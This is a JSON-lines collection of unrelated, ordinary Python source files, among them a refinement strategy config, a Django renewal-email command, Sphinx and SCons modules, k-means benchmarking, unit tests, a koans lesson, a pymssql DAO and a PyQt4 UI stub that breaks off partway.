{"text": "'''strategy setting file, note: this is an important file. You should be careful when modifying the file.\n   Please keep the format. \n   The words is case sensitive.\n   You can modify parameters group order in 'param_order' and parameters group in 'param_group'.\n'''\nstrategy={\n    \"neutron_tof\":{\n        # task type\n        \"type\":\"neutron_tof\",\n        # param group format: 'group_name':[ group_member1,group_member2,...]  \n        \"param_group\":{\n            'scale': [\"Scale\",\"Extinct\"],\n            'zero':  [\"Transparency\",\"Zero\"],\n            'simple background': [\"BACK[0]\"],\n            'cell a,b,c':  [\"a-Pha\",\"b-P\",\"c-P\"],\n            'W':     [\"W-Pr\"],\n            'complex background': [\"BACK\"],\n            \"UVW\":   [\"Sig2-Pr\", \"Sig1-Pr\",\"Sig0-Pr\"],\n            \"Asym\":  [\"ALPH\",\"BETA\"],\n            'Y,X':   [\"Gam1-Pr\",\"Gam2-Pr\"],\n            'Atom x y z':        [\"X-Atom\",\"Y-Atom\",\"Z-Atom\"],\n            'Pref,Bov':          [\"Pref\",\"Bov\"], \n            'Biso-Atom':         [\"Biso-Atom\"],\n            'GausS,1G':          [\"Z1\",\"GausS\",\"1G\"],\n            'Occ-Atom':          [\"Occ-Atom\"],\n            'Anisotropic Thermal factors': [\"B1\",\"B2\",\"B3\"],\n            'D_H':               [\"D_HG2\",\"D_HL\",\"Shift\"],\n            'S_L,D_L':           [\"PA\", \"S_L\",\"D_L\"],\n                                  #\"Sysin\",\"Displacement\",\n                                  #\"Dtt1\",                    # == \"Sysin\",\"Displacement\",\n                                  #\"Gam0\"                     # == \"LorSiz\",\"SZ\",\n                                  #\"LStr\",\"LSiz\",\"Str\",                                     \n            'instrument':         [\"Dtt2\"#,\"Sycos\",\"Transparency\"\n                                  #\"Str\",\n                                  ],\n            \"manual background\": [\"BCK\"],\n            'ABS':[\"ABS\"]\n                     },\n        # param order format: [group_name1,group_name2,...]\n        'param_order': [\n            \"scale\",\n            \"cell a,b,c\",\n            \"simple background\" , \n            \"zero\",\n            \"Atom x y z\",\n            \"Asym\",\n            \"Biso-Atom\",\n            \"complex background\" ,\n            \"UVW\",\n            \"Y,X\",\n            'D_H',\n            \"Pref,Bov\",\n            \"GausS,1G\",\n            \"instrument\",\n            \"Occ-Atom\",\n            \"Anisotropic Thermal factors\",\n            \"ABS\",\n            \"manual background\"            \n        ],\n        # target function, the valid variable : R_Factor[\"Rwp\"], R_Factor[\"Rp\"], R_Factor[\"Chi2\"]\n        # MIN = minimum function         \n        'target':'MIN=R_Factor[\"Rwp\"]'\n        }\n}"}
{"text": "import datetime\n\nfrom django.conf import settings\nfrom django.core.management.base import BaseCommand\nfrom django.template.loader import render_to_string\n\nfrom ...models import CorporateMember\nfrom home.tasks import mail_task\n\n\nclass Command(BaseCommand):\n\n    def handle(self, *args, **options):\n        thirty_days_from_now = datetime.date.today() + datetime.timedelta(days=30)\n        for member in CorporateMember.objects.filter(inactive=False):\n            if member.get_expiry_date() == thirty_days_from_now:\n                mail_task(\n                    'Expiring Conservation Technology Solutions Membership for %s' % member.display_name,\n                    render_to_string('members/corporate_member_renewal_email.txt', {\n                        'contact_name': member.contact_name,\n                        'member_name': member.display_name,\n                        'expiry_date': member.get_expiry_date(),\n                        'renewal_link': member.get_renewal_link(),\n                    }),\n                    settings.DEFAULT_FROM_EMAIL,\n                    [\n                        settings.DEFAULT_FROM_EMAIL,\n                        member.contact_email,\n                        'ctsadmin@conservationtechnologysolutions.org'\n                    ],\n                    )\n"}
{"text": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n#\n# CUED DataLogger documentation build configuration file, created by\n# sphinx-quickstart on Wed Aug 16 12:51:29 2017.\n#\n# This file is execfile()d with the current directory set to its\n# containing dir.\n#\n# Note that not all possible configuration values are present in this\n# autogenerated file.\n#\n# All configuration values have a default; values that are commented out\n# serve to show the default.\n\n# If extensions (or modules to document with autodoc) are in another directory,\n# add these directories to sys.path here. If the directory is relative to the\n# documentation root, use os.path.abspath to make it absolute, like shown here.\n#\nimport os\nimport sys\nsys.path.insert(0, os.path.abspath('../../cued_datalogger'))\n\n\n# -- General configuration ------------------------------------------------\n\n# If your documentation needs a minimal Sphinx version, state it here.\n#\n# needs_sphinx = '1.0'\n\n# Add any Sphinx extension module names here, as strings. They can be\n# extensions coming with Sphinx (named 'sphinx.ext.*') or your custom\n# ones.\nextensions = ['sphinx.ext.todo',\n    'sphinx.ext.coverage',\n    'sphinx.ext.mathjax',\n    'sphinx.ext.autodoc',\n    'sphinx.ext.viewcode',\n    #'sphinx.ext.napoleon']\n    'numpydoc']\n\n# Add any paths that contain templates here, relative to this directory.\ntemplates_path = ['_templates']\n\n# The suffix(es) of source filenames.\n# You can specify multiple suffix as a list of string:\n#\n# source_suffix = ['.rst', '.md']\nsource_suffix = '.rst'\n\n# The master toctree document.\nmaster_doc = 'index'\n\n# General information about the project.\nproject = 'CUED DataLogger'\ncopyright = '2017, Theo Brown, En Yi Tee'\nauthor = 'Theo Brown, En Yi Tee'\n\n# The version info for the project you're documenting, acts as replacement for\n# |version| and |release|, also used in various other places throughout the\n# built documents.\n#\n# The short X.Y version.\nversion = '0'\n# The full version, including alpha/beta/rc tags.\nrelease = '0'\n\n# The language for content autogenerated by Sphinx. Refer to documentation\n# for a list of supported languages.\n#\n# This is also used if you do content translation via gettext catalogs.\n# Usually you set \"language\" from the command line for these cases.\nlanguage = 'python3'\n\n# List of patterns, relative to source directory, that match files and\n# directories to ignore when looking for source files.\n# This patterns also effect to html_static_path and html_extra_path\nexclude_patterns = []\n\n# The name of the Pygments (syntax highlighting) style to use.\npygments_style = 'sphinx'\n\n# If true, `todo` and `todoList` produce output, else they produce nothing.\ntodo_include_todos = True\n\n\n# -- Options for HTML output ----------------------------------------------\n\n# The theme to use for HTML and HTML Help pages.  See the documentation for\n# a list of builtin themes.\n#\nhtml_theme = \"sphinx_rtd_theme\"\n\n# Theme options are theme-specific and customize the look and feel of a theme\n# further.  For a list of options available for each theme, see the\n# documentation.\n#\n# html_theme_options = {}\n\n# Add any paths that contain custom static files (such as style sheets) here,\n# relative to this directory. They are copied after the builtin static files,\n# so a file named \"default.css\" will overwrite the builtin \"default.css\".\nhtml_static_path = ['_static']\n\n\n# -- Options for HTMLHelp output ------------------------------------------\n\n# Output file base name for HTML help builder.\nhtmlhelp_basename = 'CUEDDataLoggerdoc'\n\n\n# -- Options for LaTeX output ---------------------------------------------\n\nlatex_elements = {\n    # The paper size ('letterpaper' or 'a4paper').\n    #\n    # 'papersize': 'letterpaper',\n\n    # The font size ('10pt', '11pt' or '12pt').\n    #\n    # 'pointsize': '10pt',\n\n    # Additional stuff for the LaTeX preamble.\n    #\n    # 'preamble': '',\n\n    # Latex figure (float) alignment\n    #\n    # 'figure_align': 'htbp',\n}\n\n# Grouping the document tree into LaTeX files. List of tuples\n# (source start file, target name, title,\n#  author, documentclass [howto, manual, or own class]).\nlatex_documents = [\n    (master_doc, 'CUEDDataLogger.tex', 'CUED DataLogger Documentation',\n     'Theo Brown, En Yi Tee', 'manual'),\n]\n\n\n# -- Options for manual page output ---------------------------------------\n\n# One entry per manual page. List of tuples\n# (source start file, name, description, authors, manual section).\nman_pages = [\n    (master_doc, 'cued_datalogger', 'CUED DataLogger Documentation',\n     [author], 1)\n]\n\n\n# -- Options for Texinfo output -------------------------------------------\n\n# Grouping the document tree into Texinfo files. List of tuples\n# (source start file, target name, title, author,\n#  dir menu entry, description, category)\ntexinfo_documents = [\n    (master_doc, 'CUEDDataLogger', 'CUED DataLogger Documentation',\n     author, 'CUEDDataLogger', 'One line description of project.',\n     'Miscellaneous'),\n]\n\n#-----------Options put in by Theo--------------------------------------------\nautodoc_mock_imports = ['pyaudio', 'pyDAQmx']\n\nautodoc_default_flags = ['show-inheritance']\nautodoc_member_order = 'alphabetical'\n\n"}
{"text": "\"\"\"\npython speedup_kmeans.py --profile\npython speedup_kmeans.py\n\ngit worktree add workdir_master master\nrob sedr \"\\<sklearn\\>\" sklearn_master True\ngit mv sklearn sklearn_master\npython setup develop\npython -c \"import sklearn_master; print(sklearn_master.__file__)\"\npython -c \"import sklearn; print(sklearn.__file__)\"\n\"\"\"\nfrom __future__ import absolute_import, division, print_function, unicode_literals\nimport utool as ut\nimport sklearn  # NOQA\nfrom sklearn.datasets.samples_generator import make_blobs\nfrom sklearn.utils.extmath import row_norms, squared_norm  # NOQA\nimport sklearn.cluster\nimport numpy as np\nfrom sklearn.metrics.pairwise import euclidean_distances  # NOQA\n\nimport sklearn_master.cluster\n(print, rrr, profile) = ut.inject2(__name__, '[tester]')\n\n\ndef test_kmeans_plus_plus_speed(n_clusters=2000, n_features=128, per_cluster=10, asint=False, fix=True):\n    \"\"\"\n    from speedup_kmeans import *\n    from sklearn.cluster.k_means_ import *\n    \"\"\"\n    rng = np.random.RandomState(42)\n    # Make random cluster centers on a ball\n    centers = rng.rand(n_clusters, n_features)\n    centers /= np.linalg.norm(centers, axis=0)[None, :]\n    centers = (centers * 512).astype(np.uint8) / 512\n    centers /= np.linalg.norm(centers, axis=0)[None, :]\n\n    n_samples = int(n_clusters * per_cluster)\n    n_clusters, n_features = centers.shape\n    X, true_labels = make_blobs(n_samples=n_samples, centers=centers,\n                                cluster_std=1., random_state=42)\n\n    if asint:\n        X = (X * 512).astype(np.int32)\n\n    x_squared_norms = row_norms(X, squared=True)\n\n    if fix:\n        _k_init = sklearn.cluster.k_means_._k_init\n    else:\n        _k_init = sklearn_master.cluster.k_means_._k_init\n    random_state = np.random.RandomState(42)\n    n_local_trials = None  # NOQA\n\n    with ut.Timer('testing kmeans init') as t:\n        centers = _k_init(X, n_clusters, random_state=random_state, x_squared_norms=x_squared_norms)\n    return centers, t.ellapsed\n\n\ndef main():\n    if True:\n        import pandas as pd\n        pd.options.display.max_rows = 1000\n        pd.options.display.width = 1000\n\n        basis = {\n            #'n_clusters': [10, 100, 1000, 2000][::-1],\n            #'n_features': [4, 32, 128, 512][::-1],\n            #'per_cluster': [1, 10, 100, 200][::-1],\n            'n_clusters': [10, 100, 500][::-1],\n            'n_features': [32, 128][::-1],\n            'per_cluster': [1, 10, 20][::-1],\n            'asint': [True, False],\n        }\n        vals = []\n        for kw in ut.ProgIter(ut.all_dict_combinations(basis), lbl='gridsearch',\n                              bs=False, adjust=False, freq=1):\n            print('kw = ' + ut.repr2(kw))\n            exec(ut.execstr_dict(kw))\n            centers1, new_speed = test_kmeans_plus_plus_speed(fix=True, **kw)\n            centers2, old_speed = test_kmeans_plus_plus_speed(fix=False, **kw)\n            import utool\n            with utool.embed_on_exception_context:\n                assert np.all(centers1 == centers2), 'new code disagrees'\n\n            kw['new_speed'] = new_speed\n            kw['old_speed'] = old_speed\n            vals.append(kw)\n            print('---------')\n\n        df = pd.DataFrame.from_dict(vals)\n        df['percent_change'] = 100 * (df['old_speed'] - df['new_speed']) / df['old_speed']\n        df = df.reindex_axis(list(basis.keys()) + ['new_speed', 'old_speed', 'percent_change'], axis=1)\n        df['absolute_change'] = (df['old_speed'] - df['new_speed'])\n        print(df.sort('absolute_change', ascending=False))\n        #print(df)\n\n        print(df['percent_change'][df['absolute_change'] > .1].mean())\n\n    #print(df.loc[df['percent_change'].argsort()[::-1]])\n    else:\n        new_speed = test_kmeans_plus_plus_speed()\n        try:\n            profile.dump_stats('out.lprof')\n            profile.print_stats(stripzeros=True)\n        except Exception:\n            pass\n        print('new_speed = %r' % (new_speed,))\n\nif __name__ == '__main__':\n    main()\n"}
{"text": "# Copyright (C) 2015 University of Nebraska at Omaha\n# Copyright (C) 2015 Thomas T. Gurney\n#\n# This file is part of dosocs2.\n#\n# dosocs2 is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 2 of the License, or\n# (at your option) any later version.\n#\n# dosocs2 is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with dosocs2.  If not, see <http://www.gnu.org/licenses/>.\n#\n# SPDX-License-Identifier: GPL-2.0+\n\nimport json\nimport string\n\nfrom sqlalchemy.sql import select, and_, update\n\nfrom . import schema as db\nfrom .spdxdb import insert, bulk_insert\n\n\ndef lookup_license(conn, short_name):\n    query = (\n        select([db.licenses])\n        .where(db.licenses.c.short_name == short_name)\n        )\n    [result] = conn.execute(query).fetchall() or [None]\n    if result is None:\n        return result\n    else:\n        return dict(**result)\n\n\ndef lookup_or_add_license(conn, short_name, comment=None):\n    '''Add license to the database if it does not exist.\n\n    Return the new or existing license object in any case.\n    '''\n    transtable = string.maketrans('()[]<>', '------')\n    short_name = string.translate(short_name, transtable)\n    existing_license = lookup_license(conn, short_name)\n    if existing_license is not None:\n        return existing_license\n    new_license = {\n        # correct long name is never known for found licenses\n        'name': None,\n        'short_name': short_name,\n        'cross_reference': '',\n        'comment': comment or '',\n        'is_spdx_official': False,\n        }\n    new_license['license_id'] = insert(conn, db.licenses, new_license)\n    return new_license\n\n\ndef add_file_licenses(conn, rows):\n    to_add = {}\n    for file_license_params in rows:\n        query = (\n            select([db.files_licenses])\n            .where(\n                and_(\n                    db.files_licenses.c.file_id == file_license_params['file_id'],\n                    db.files_licenses.c.license_id == file_license_params['license_id']\n                    )\n                )\n            )\n        [already_exists] = conn.execute(query).fetchall() or [None]\n        if already_exists is None:\n            key = file_license_params['file_id'], file_license_params['license_id']\n            to_add[key] = file_license_params\n    bulk_insert(conn, db.files_licenses, list(to_add.values()))\n\ndef add_file_copyright(conn, file_id, text):\n    query = update(db.files).values({'copyright_text': text}).where(db.files.c.file_id == file_id)\n    conn.execute(query)\n\ndef add_cpes(conn, package_id, cpes):\n    json_text = json.dumps(cpes)\n    query = update(db.packages).values({'comment': json_text}).where(db.packages.c.package_id == package_id)\n    conn.execute(query)\n"}
{"text": "# Example: calc_abundance()\n#     determine ionic abundance from observed\n#     flux intensity for gievn electron density\n#     and temperature using  calc_abundance function\n#     from proEQUIB\n#\n# --- Begin MAIN program. ---------------\n#\n#\nimport pyequib\nimport atomneb\nimport os\nimport numpy as np\n\n# Locate datasets\nbase_dir = '../externals/atomneb/'\ndata_dir = os.path.join('atomic-data', 'chianti70')\ndata_rc_dir = os.path.join('atomic-data-rc')\natom_elj_file = os.path.join(base_dir,data_dir, 'AtomElj.fits')\natom_omij_file = os.path.join(base_dir,data_dir, 'AtomOmij.fits')\natom_aij_file = os.path.join(base_dir,data_dir, 'AtomAij.fits')\natom_rc_sh95_file = os.path.join(base_dir,data_rc_dir, 'rc_SH95.fits')\n\natom = 'h'\nion = 'ii' # H I Rec\nhi_rc_data = atomneb.read_aeff_sh95(atom_rc_sh95_file, atom, ion)\n\natom = 'o'\nion = 'iii' # [O III]\no_iii_elj = atomneb.read_elj(atom_elj_file, atom, ion, level_num=5) # read Energy Levels (Ej)\no_iii_omij = atomneb.read_omij(atom_omij_file, atom, ion) # read Collision Strengths (Omegaij)\no_iii_aij = atomneb.read_aij(atom_aij_file, atom, ion) # read Transition Probabilities (Aij)\n\nlevels5007 = '3,4/'\ntemperature = np.float64(10000.0,)\ndensity = np.float64(5000.0)\niobs5007 = np.float64(1200.0)\nabb5007 = np.float64(0.0)\n\nemis = pyequib.calc_emissivity(temperature=temperature, density=density, atomic_levels=levels5007, elj_data=o_iii_elj, omij_data=o_iii_omij, aij_data=o_iii_aij)\nprint('Emissivity(O III 5007):', emis)\n\nabb5007 = pyequib.calc_abundance(temperature=temperature, density=density, line_flux=iobs5007, atomic_levels=levels5007,\n                         elj_data=o_iii_elj, omij_data=o_iii_omij, aij_data=o_iii_aij, h_i_aeff_data=hi_rc_data['aeff'][0])\nprint('N(O^2+)/N(H+):', abb5007)\n\nnlj = pyequib.calc_populations(temperature=temperature, density=density, elj_data=o_iii_elj, omij_data=o_iii_omij, aij_data=o_iii_aij)\nprint('Atomic Level Populations:', nlj)\n\nn_crit = pyequib.calc_crit_density(temperature=temperature, elj_data=o_iii_elj, omij_data=o_iii_omij, aij_data=o_iii_aij)\nprint('Critical Densities:', n_crit)\n\ntemperature = np.float64(10000.0)\nomij_t = pyequib.get_omij_temp(temperature=temperature, omij_data=o_iii_omij, level_num=8)\nprint('Effective Collision Strengths: ')\nprint(omij_t)\n\npyequib.print_ionic(temperature=temperature, density=density,\n            elj_data=o_iii_elj, omij_data=o_iii_omij, aij_data=o_iii_aij,\n            h_i_aeff_data=hi_rc_data['aeff'][0])\n#\n# --- End MAIN program. ---------------\n\n"}
{"text": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nimport unittest\n\nfrom run_length import encode, decode\n\n\nclass WordCountTests(unittest.TestCase):\n\n    def test_encode(self): #PASS\n        self.assertMultiLineEqual('2A3B4C', encode('AABBBCCCC'))\n\n    def test_decode(self):\n        self.assertMultiLineEqual('AABBBCCCC', decode('2A3B4C'))\n\n    def test_encode_with_single(self): #PASS\n        self.assertMultiLineEqual(\n            '12WB12W3B24WB',\n            encode('WWWWWWWWWWWWBWWWWWWWWWWWWBBBWWWWWWWWWWWWWWWWWWWWWWWWB'))\n\n    def test_decode_with_single(self):\n        self.assertMultiLineEqual(\n            'WWWWWWWWWWWWBWWWWWWWWWWWWBBBWWWWWWWWWWWWWWWWWWWWWWWWB',\n            decode('12WB12W3B24WB'))\n\n    def test_combination(self):\n        self.assertMultiLineEqual('zzz ZZ  zZ', decode(encode('zzz ZZ  zZ')))\n\n    def test_encode_unicode_s(self):\n        self.assertMultiLineEqual('\u23f03\u26bd2\u2b50\u23f0', encode('\u23f0\u26bd\u26bd\u26bd\u2b50\u2b50\u23f0'))\n\n    def test_decode_unicode(self):\n        self.assertMultiLineEqual('\u23f0\u26bd\u26bd\u26bd\u2b50\u2b50\u23f0', decode('\u23f03\u26bd2\u2b50\u23f0'))\n\nif __name__ == '__main__':\n    unittest.main()\n"}
{"text": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n#\n# Written in place of AboutBlocks in the Ruby Koans\n#\n# Note: Both blocks and generators use a yield keyword, but they behave\n# a lot differently\n#\n\nfrom runner.koan import *\n\nclass AboutGenerators(Koan):\n\n    def test_generating_values_on_the_fly(self):\n        result = list()\n        bacon_generator = (n + ' bacon' for n in ['crunchy','veggie','danish'])\n\n        for bacon in bacon_generator:\n            result.append(bacon)\n\n        self.assertEqual(['crunchy bacon', 'veggie bacon', 'danish bacon'], result)\n\n    def test_generators_are_different_to_list_comprehensions(self):\n        num_list = [x*2 for x in range(1,3)]\n        num_generator = (x*2 for x in range(1,3))\n\n        self.assertEqual(2, num_list[0])\n\n        # A generator has to be iterated through.\n        with self.assertRaises(TypeError): num = num_generator[0]\n\n        self.assertEqual(2, list(num_generator)[0])\n\n        # Both list comprehensions and generators can be iterated though. However, a generator\n        # function is only called on the first iteration. The values are generated on the fly\n        # instead of stored.\n        #\n        # Generators are more memory friendly, but less versatile\n\n    def test_generator_expressions_are_a_one_shot_deal(self):\n        dynamite = ('Boom!' for n in range(3))\n\n        attempt1 = list(dynamite)\n        attempt2 = list(dynamite)\n\n        self.assertEqual(['Boom!', 'Boom!', 'Boom!'], list(attempt1))\n        self.assertEqual([], list(attempt2))\n\n    # ------------------------------------------------------------------\n\n    def simple_generator_method(self):\n        yield 'peanut'\n        yield 'butter'\n        yield 'and'\n        yield 'jelly'\n\n    def test_generator_method_will_yield_values_during_iteration(self):\n        result = list()\n        for item in self.simple_generator_method():\n            result.append(item)\n        self.assertEqual(['peanut', 'butter', 'and', 'jelly'], result)\n\n    def test_coroutines_can_take_arguments(self):\n        result = self.simple_generator_method()\n        self.assertEqual('peanut', next(result))\n        self.assertEqual('butter', next(result))\n        result.close()\n\n    # ------------------------------------------------------------------\n\n    def square_me(self, seq):\n        for x in seq:\n            yield x * x\n\n    def test_generator_method_with_parameter(self):\n        result = self.square_me(range(2,5))\n        self.assertEqual([4, 9, 16], list(result))\n\n    # ------------------------------------------------------------------\n\n    def sum_it(self, seq):\n        value = 0\n        for num in seq:\n            # The local state of 'value' will be retained between iterations\n            value += num\n            yield value\n\n    def test_generator_keeps_track_of_local_variables(self):\n        result = self.sum_it(range(2,5))\n        self.assertEqual([2, 5, 9], list(result))\n\n    # ------------------------------------------------------------------\n\n    def generator_with_coroutine(self):\n        result = yield\n        yield result\n\n    def test_generators_can_take_coroutines(self):\n        generator = self.generator_with_coroutine()\n\n        # THINK ABOUT IT:\n        # Why is this line necessary?\n        #\n        # Hint: Read the \"Specification: Sending Values into Generators\"\n        #       section of http://www.python.org/dev/peps/pep-0342/\n        next(generator)\n\n        self.assertEqual(3, generator.send(1 + 2))\n\n    def test_before_sending_a_value_to_a_generator_next_must_be_called(self):\n        generator = self.generator_with_coroutine()\n\n        try:\n            generator.send(1+2)\n        except TypeError as ex:\n          ex2 = ex\n\n        self.assertRegexpMatches(ex2.args[0], 'just-started')\n\n    # ------------------------------------------------------------------\n\n    def yield_tester(self):\n        value = yield\n        if value:\n            yield value\n        else:\n            yield 'no value'\n\n    def test_generators_can_see_if_they_have_been_called_with_a_value(self):\n        generator = self.yield_tester()\n        next(generator)\n        self.assertEqual('with value', generator.send('with value'))\n\n        generator2 = self.yield_tester()\n        next(generator2)\n        self.assertEqual('no value', next(generator2))\n\n    def test_send_none_is_equivalent_to_next(self):\n        generator = self.yield_tester()\n\n        next(generator)\n        # 'next(generator)' is exactly equivalent to 'generator.send(None)'\n        self.assertEqual('no value', generator.send(None))\n\n\n"}
{"text": "# -*- coding: utf-8 -*-\n\nimport pymssql\n\n\nclass Dao:\n    def __init__(self):\n        self.conn = None\n        self.cur = None\n\n    def connect(self):\n        # \u6570\u636e\u5e93\u8fde\u63a5\u4fe1\u606f\n        self.conn = pymssql.connect(host=\"localhost:59318\", user=\"eachen\", password=\"123456\", database=\"mydata\",\n                                    charset=\"utf8\")\n        # host = \"localhost:59318\", user = \"eachen\", pwd = \"123456\", db = \"mydata\"\n        self.cur = self.conn.cursor()\n        if not self.cur:\n            raise (NameError, \"\u6570\u636e\u5e93\u8fde\u63a5\u5931\u8d25\")\n        else:\n            print(\"\u6570\u636e\u5e93\u8fde\u63a5\u6210\u529f\")\n\n    def create(self, sql):\n        # print(sql)\n        try:\n            self.cur.execute(sql)\n            self.conn.commit()\n        except:\n            print('create failed')\n        else:\n            print('create succeed')\n\n    def insert(self, sql):\n        # print(sql)\n        self.cur.execute(sql)\n        self.conn.commit()\n\n    def select(self, sql):\n        # print(sql)\n        self.cur.execute(sql)\n        # fetchall()\u662f\u63a5\u6536\u5168\u90e8\u7684\u8fd4\u56de\u7ed3\u679c\u884c\n        return self.cur.fetchall()\n\n    def close(self):\n        self.conn.close()\n"}
{"text": "\"\"\"SCons.Platform\n\nSCons platform selection.\n\nThis looks for modules that define a callable object that can modify a\nconstruction environment as appropriate for a given platform.\n\nNote that we take a more simplistic view of \"platform\" than Python does.\nWe're looking for a single string that determines a set of\ntool-independent variables with which to initialize a construction\nenvironment.  Consequently, we'll examine both sys.platform and os.name\n(and anything else that might come in to play) in order to return some\nspecification which is unique enough for our purposes.\n\nNote that because this subsysem just *selects* a callable that can\nmodify a construction environment, it's possible for people to define\ntheir own \"platform specification\" in an arbitrary callable function.\nNo one needs to use or tie in to this subsystem in order to roll\ntheir own platform definition.\n\"\"\"\n\n#\n# Copyright (c) 2001, 2002, 2003, 2004 The SCons Foundation\n# \n# Permission is hereby granted, free of charge, to any person obtaining\n# a copy of this software and associated documentation files (the\n# \"Software\"), to deal in the Software without restriction, including\n# without limitation the rights to use, copy, modify, merge, publish,\n# distribute, sublicense, and/or sell copies of the Software, and to\n# permit persons to whom the Software is furnished to do so, subject to\n# the following conditions:\n#\n# The above copyright notice and this permission notice shall be included\n# in all copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY\n# KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE\n# WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE\n# LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION\n# OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION\n# WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n#\n\n__revision__ = \"/home/scons/scons/branch.0/baseline/src/engine/SCons/Platform/__init__.py 0.96.1.D001 2004/08/23 09:55:29 knight\"\n\nimport imp\nimport os\nimport string\nimport sys\n\nimport SCons.Errors\nimport SCons.Tool\n\ndef platform_default():\n    \"\"\"Return the platform string for our execution environment.\n\n    The returned value should map to one of the SCons/Platform/*.py\n    files.  Since we're architecture independent, though, we don't\n    care about the machine architecture.\n    \"\"\"\n    osname = os.name\n    if osname == 'java':\n        osname = os._osType\n    if osname == 'posix':\n        if sys.platform == 'cygwin':\n            return 'cygwin'\n        elif string.find(sys.platform, 'irix') != -1:\n            return 'irix'\n        elif string.find(sys.platform, 'sunos') != -1:\n            return 'sunos'\n        elif string.find(sys.platform, 'hp-ux') != -1:\n            return 'hpux'\n        elif string.find(sys.platform, 'aix') != -1:\n            return 'aix'\n        elif string.find(sys.platform, 'darwin') != -1:\n            return 'darwin'\n        else:\n            return 'posix'\n    elif os.name == 'os2':\n        return 'os2'\n    else:\n        return sys.platform\n\ndef platform_module(name = platform_default()):\n    \"\"\"Return the imported module for the platform.\n\n    This looks for a module name that matches the specified argument.\n    If the name is unspecified, we fetch the appropriate default for\n    our execution environment.\n    \"\"\"\n    full_name = 'SCons.Platform.' + name\n    if not sys.modules.has_key(full_name):\n        if os.name == 'java':\n            eval(full_name)\n        else:\n            try:\n                file, path, desc = imp.find_module(name,\n                                        sys.modules['SCons.Platform'].__path__)\n                mod = imp.load_module(full_name, file, path, desc)\n                setattr(SCons.Platform, name, mod)\n            except ImportError:\n                raise SCons.Errors.UserError, \"No platform named '%s'\" % name\n            if file:\n                file.close()\n    return sys.modules[full_name]\n\ndef DefaultToolList(platform, env):\n    \"\"\"Select a default tool list for the specified platform.\n    \"\"\"\n    return SCons.Tool.tool_list(platform, env)\n\nclass PlatformSpec:\n    def __init__(self, name):\n        self.name = name\n\n    def __str__(self):\n        return self.name\n    \ndef Platform(name = platform_default()):\n    \"\"\"Select a canned Platform specification.\n    \"\"\"\n    module = platform_module(name)\n    spec = PlatformSpec(name)\n    spec.__call__ = module.generate\n    return spec\n"}
{"text": "# -*- coding: utf-8 -*-\n\n# Form implementation generated from reading ui file 'Processor.ui'\n#\n# Created: Wed Jul 29 08:15:05 2015\n#      by: PyQt4 UI code generator 4.10.4\n#\n# WARNING! All changes made in this file will be lost!\n\nfrom PyQt4 import QtCore, QtGui\n\ntry:\n    _fromUtf8 = QtCore.QString.fromUtf8\nexcept AttributeError:\n    def _fromUtf8(s):\n        return s\n\ntry:\n    _encoding = QtGui.QApplication.UnicodeUTF8\n    def _translate(context, text, disambig):\n        return QtGui.QApplication.translate(context, text, disambig, _encoding)\nexcept AttributeError:\n    def _translate(context, text, disambig):\n        return QtGui.QApplication.translate(context, text, disambig)\n\nclass Ui_MainWindow(object):\n    def setupUi(self, MainWindow):\n        MainWindow.setObjectName(_fromUtf8(\"MainWindow\"))\n        MainWindow.resize(550, 388)\n        sizePolicy = QtGui.QSizePolicy(QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Expanding)\n        sizePolicy.setHorizontalStretch(0)\n        sizePolicy.setVerticalStretch(0)\n        sizePolicy.setHeightForWidth(MainWindow.sizePolicy().hasHeightForWidth())\n        MainWindow.setSizePolicy(sizePolicy)\n        self.centralwidget = QtGui.QWidget(MainWindow)\n        self.centralwidget.setObjectName(_fromUtf8(\"centralwidget\"))\n        self.horizontalLayoutWidget = QtGui.QWidget(self.centralwidget)\n        self.horizontalLayoutWidget.setGeometry(QtCore.QRect(0, 0, 551, 331))\n        self.horizontalLayoutWidget.setObjectName(_fromUtf8(\"horizontalLayoutWidget\"))\n        self.horizontalLayout = QtGui.QHBoxLayout(self.horizontalLayoutWidget)\n        self.horizontalLayout.setSizeConstraint(QtGui.QLayout.SetNoConstraint)\n        self.horizontalLayout.setMargin(0)\n        self.horizontalLayout.setObjectName(_fromUtf8(\"horizontalLayout\"))\n        self.treeView = QtGui.QTreeView(self.horizontalLayoutWidget)\n        sizePolicy = QtGui.QSizePolicy(QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Expanding)\n        sizePolicy.setHorizontalStretch(0)\n        sizePolicy.setVerticalStretch(0)\n        sizePolicy.setHeightForWidth(self.treeView.sizePolicy().hasHeightForWidth())\n        self.treeView.setSizePolicy(sizePolicy)\n        self.treeView.setMaximumSize(QtCore.QSize(150, 16777215))\n        self.treeView.setObjectName(_fromUtf8(\"treeView\"))\n        self.horizontalLayout.addWidget(self.treeView)\n        self.graphicsView = QtGui.QGraphicsView(self.horizontalLayoutWidget)\n        self.graphicsView.setObjectName(_fromUtf8(\"graphicsView\"))\n        self.horizontalLayout.addWidget(self.graphicsView)\n        MainWindow.setCentralWidget(self.centralwidget)\n        self.menubar = QtGui.QMenuBar(MainWindow)\n        self.menubar.setGeometry(QtCore.QRect(0, 0, 550, 27))\n        self.menubar.setObjectName(_fromUtf8(\"menubar\"))\n        self.menuFile = QtGui.QMenu(self.menubar)\n        self.menuFile.setObjectName(_fromUtf8(\"menuFile\"))\n        self.menuAction = QtGui.QMenu(self.menubar)\n        self.menuAction.setObjectName(_fromUtf8(\"menuAction\"))\n        MainWindow.setMenuBar(self.menubar)\n        self.statusbar = QtGui.QStatusBar(MainWindow)\n        